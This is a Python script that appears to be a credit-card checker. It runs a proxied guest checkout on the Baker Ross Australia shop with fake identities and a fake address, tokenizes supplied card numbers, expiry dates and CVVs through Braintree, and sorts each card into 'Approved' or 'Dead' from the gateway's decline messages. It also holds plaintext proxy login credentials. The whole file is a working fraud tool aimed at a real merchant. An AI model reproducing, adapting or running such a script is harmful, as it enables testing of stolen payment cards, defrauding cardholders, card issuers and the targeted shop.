import random
import uuid
import names
import requests
from config.ConfigsBraintree import BehaviorsBraintree
from dataclasses import dataclass
from retry import retry

def cut_str(text: str, a: str, b: str) -> str:
    try:
        return text.split(a)[1].split(b)[0]
    except IndexError:
        print(f"Error: No se pudo cortar la cadena entre '{a}' y '{b}'")
        return None

def phone_number(longitud):  
    return ''.join([str(random.randint(0, 9)) for _ in range(longitud)])

class ConfigsPAge:
    @classmethod
    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id

    @classmethod
    def RandomName(self, dato: str = None):
        if dato == 'username':
            self.username = "{}{}{}".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000, 9999999)
            )
            return self.username
        elif dato == 'email':
            self.email = "{}{}{}@gmail.com".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000, 9999999)
            )
            return self.email
        elif dato == 'password':
            self.password = "{}{}#{}".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000, 9999999)
            )
            return self.password
        elif dato == 'numero':
            self.number = ''.join([str(random.randint(0, 9)) for _ in range(10)])
            return self.number
        else:
            return 'Valores incorrectos: >>>   ConfigsPAge().RandomName("username")'

    def SaveResponseHtml(self, response: str):
        try:
            with open("ResponseHtml.html", "w", encoding="utf-8") as f:
                f.write(response)
        except Exception as e:
            print(f"Error guardando el archivo: {e}")

# Proxy
proxy_url = 'http://bb7c7e53e570809d:RNW78Fm5@res.proxy-seller.com:10000'

@dataclass
class b3mg:
    @retry(tries=3)
    def main(self, card):
        try:
            cc = card.split("|")
            self.Nombre = ConfigsPAge().RandomName('username')
            self.UseMail = ConfigsPAge().RandomName('email')

            self.session = requests.Session()
            self.session.proxies.update({
                'http': proxy_url,
                'https': proxy_url
            })
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://www.bakerross.com.au/craft-kits/clearance','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            r1 = self.session.get('https://www.bakerross.com.au/easter-egg-stained-glass-lantern-kits-1', headers=headers,)
            form_key = cut_str(r1.text,'name="form_key" type="hidden" value="','"')

            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-419,es;q=0.9','content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryWPiqE1hLyxdR0H7y','origin': 'https://www.bakerross.com.au','priority': 'u=1, i','referer': 'https://www.bakerross.com.au/easter-egg-stained-glass-lantern-kits-1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest','cookie': f'form_key={form_key}',}
            data = f'------WebKitFormBoundaryWPiqE1hLyxdR0H7y\r\nContent-Disposition: form-data; name="product"\r\n\r\n144541\r\n------WebKitFormBoundaryWPiqE1hLyxdR0H7y\r\nContent-Disposition: form-data; name="selected_configurable_option"\r\n\r\n\r\n------WebKitFormBoundaryWPiqE1hLyxdR0H7y\r\nContent-Disposition: form-data; name="related_product"\r\n\r\n\r\n------WebKitFormBoundaryWPiqE1hLyxdR0H7y\r\nContent-Disposition: form-data; name="form_key"\r\n\r\n{form_key}\r\n------WebKitFormBoundaryWPiqE1hLyxdR0H7y\r\nContent-Disposition: form-data; name="super_group[144914]"\r\n\r\n1\r\n------WebKitFormBoundaryWPiqE1hLyxdR0H7y\r\nContent-Disposition: form-data; name="super_group[144915]"\r\n\r\n0\r\n------WebKitFormBoundaryWPiqE1hLyxdR0H7y\r\nContent-Disposition: form-data; name="social_share_product_url"\r\n\r\nhttps://www.bakerross.com.au/easter-egg-stained-glass-lantern-kits-1\r\n------WebKitFormBoundaryWPiqE1hLyxdR0H7y--\r\n'
            response = self.session.post('https://www.bakerross.com.au/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuYmFrZXJyb3NzLmNvbS5hdS9lYXN0ZXItZWdnLXN0YWluZWQtZ2xhc3MtbGFudGVybi1raXRzLTE%2C/product/144541/', headers=headers, data=data,)
            phpsessidvalue = self.session.cookies.get('PHPSESSID')

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','priority': 'u=0, i','referer': 'https://www.bakerross.com.au/easter-egg-stained-glass-lantern-kits-1','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','cookie': 'form_key=' +form_key+ '; PHPSESSID=' +phpsessidvalue+ '',}
            response = self.session.get('https://www.bakerross.com.au/checkout/cart/', headers=headers)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','priority': 'u=0, i','referer': 'https://www.bakerross.com.au/checkout/cart/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','cookie': 'form_key=' +form_key+ '; PHPSESSID=' +phpsessidvalue+ '',}
            r2 = self.session.get('https://www.bakerross.com.au/checkout/', headers=headers)
            entity_id = cut_str(r2.text,'{"entity_id":"', '"')
            clientToken = cut_str(r2.text,'"clientToken":"', '"')
            self.client_eyj = BehaviorsBraintree().DecodeBear(clientToken)
 
            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9','content-type': 'application/json','origin': 'https://www.bakerross.com.au','priority': 'u=1, i','referer': 'https://www.bakerross.com.au/checkout/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest','cookie': 'form_key=' +form_key+ '; PHPSESSID=' +phpsessidvalue+ '',}
            json_data = {'addressInformation': {'address': {'countryId': 'AU','region': 'NY','postcode': '10036',},'shipping_method_code': 'amstrates14_AU-STANDARD-M','shipping_carrier_code': 'amstrates',},}
            response = self.session.post(f'https://www.bakerross.com.au/rest/baker_ross_australia/V1/guest-carts/{entity_id}/totals-information', headers=headers, json=json_data,)

            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9','content-type': 'application/json','origin': 'https://www.bakerross.com.au','priority': 'u=1, i','referer': 'https://www.bakerross.com.au/checkout/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest','cookie': 'form_key=' +form_key+ '; PHPSESSID=' +phpsessidvalue+ '',}
            json_data = {'addressInformation': {'shipping_address': {'countryId': 'AU','region': 'NY','street': ['11 Times Sq Fl 20',],'company': '','telephone': '','postcode': '10036','city': 'New York','firstname': 'Deeerek','lastname': 'Dyaln','customAttributes': {'mobile': '5667849342',},'extension_attributes': {'contact_email_value': self.UseMail,'organisation_type': 'Other','bakerross_checkout_method': 'guest',},},'billing_address': {'countryId': 'AU','region': 'NY','street': ['11 Times Sq Fl 20',],'company': '','telephone': '','postcode': '10036','city': 'New York','firstname': 'Deeerek','lastname': 'Dyaln','customAttributes': {'mobile': '5667849342',},'extension_attributes': {'contact_email_value': self.UseMail,'organisation_type': 'Other','bakerross_checkout_method': 'guest',},'saveInAddressBook': None,},'shipping_method_code': 'amstrates14_AU-STANDARD-M','shipping_carrier_code': 'amstrates',},}
            response = self.session.post(f'https://www.bakerross.com.au/rest/baker_ross_australia/V1/guest-carts/{entity_id}/shipping-information', headers=headers, json=json_data,)

            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9','content-type': 'application/json','origin': 'https://www.bakerross.com.au','priority': 'u=1, i','referer': 'https://www.bakerross.com.au/checkout/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest','cookie': 'form_key=' +form_key+ '; PHPSESSID=' +phpsessidvalue+ '',}
            json_data = {'shipping_country_id': 'AU','shipping_company': '','billing_country_id': 'AU','billing_company': '',}
            response = self.session.post('https://www.bakerross.com.au/checkout/klarna/checkoutConfig/', headers=headers, json=json_data,)

            self.session_client_id = BehaviorsBraintree().SessionId()
            self.ccs = BehaviorsBraintree().Ccs(card)


            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9','authorization': f'Bearer {self.client_eyj}','braintree-version': '2018-05-10','content-type': 'application/json','origin': 'https://assets.braintreegateway.com','priority': 'u=1, i','referer': 'https://assets.braintreegateway.com/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            json_data = {'clientSdkMetadata': {'source': 'client','integration': 'custom','sessionId': self.session_client_id,},'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }','variables': {'input': {'creditCard': {'number': self.ccs[0],'expirationMonth': self.ccs[1],'expirationYear': self.ccs[2],'cvv': self.ccs[3],},'options': {'validate': False,},},},'operationName': 'TokenizeCreditCard',}
            r3 = self.session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
            self.token_card = BehaviorsBraintree().QueryText(r3.text,'"token":"','"')
    
            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9','content-type': 'application/json','origin': 'https://www.bakerross.com.au','priority': 'u=1, i','referer': 'https://www.bakerross.com.au/checkout/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest','cookie': 'form_key=' +form_key+ '; PHPSESSID=' +phpsessidvalue+ '',}
            json_data = {'cartId': entity_id,'billingAddress': {'countryId': 'AU','region': 'NY','street': ['11 Times Sq Fl 20',],'company': '','telephone': '','postcode': '10036','city': 'New York','firstname': 'Deeerek','lastname': 'Dyaln','customAttributes': {'mobile': '5667849342',},'extension_attributes': {'contact_email_value': self.UseMail,'organisation_type': 'Other','bakerross_checkout_method': 'guest',},'saveInAddressBook': None,},'paymentMethod': {'method': 'braintree','additional_data': {'payment_method_nonce': self.token_card,},},'email': self.UseMail,}
            r4 = self.session.post(f'https://www.bakerross.com.au/rest/baker_ross_australia/V1/guest-carts/{entity_id}/payment-information', headers=headers, json=json_data,)
            self.session.close()
            Suceess = r4.text 
            msg = BehaviorsBraintree().QueryText(Suceess,'"message":"', '"')

            if r4.status_code == 302 or r4.status_code == 200:
                status = "Approved! ✅"
                msg = "$11.99"
            elif msg == "Your payment could not be taken. Please try again or use a different payment method. Gateway Rejected: avs":
                status = "Approved! ✅"
            elif msg == "Your payment could not be taken. Please try again or use a different payment method. Insufficient Funds":
                status = "Approved! ✅"
            elif (
                msg == "Your payment could not be taken. Please try again or use a different payment method. Card Issuer Declined CVV"
                or msg == "Your payment could not be taken. Please try again or use a different payment method. avs_and_cvv"
                or msg == "Your payment could not be taken. Please try again or use a different payment method. cvv"
            ):
                status = "Approved! ✅"
            else:
                status = "Dead! ❌"

            return status, msg
        except: 
            return 'Declined! ❌','Declined - Call Issue'
            
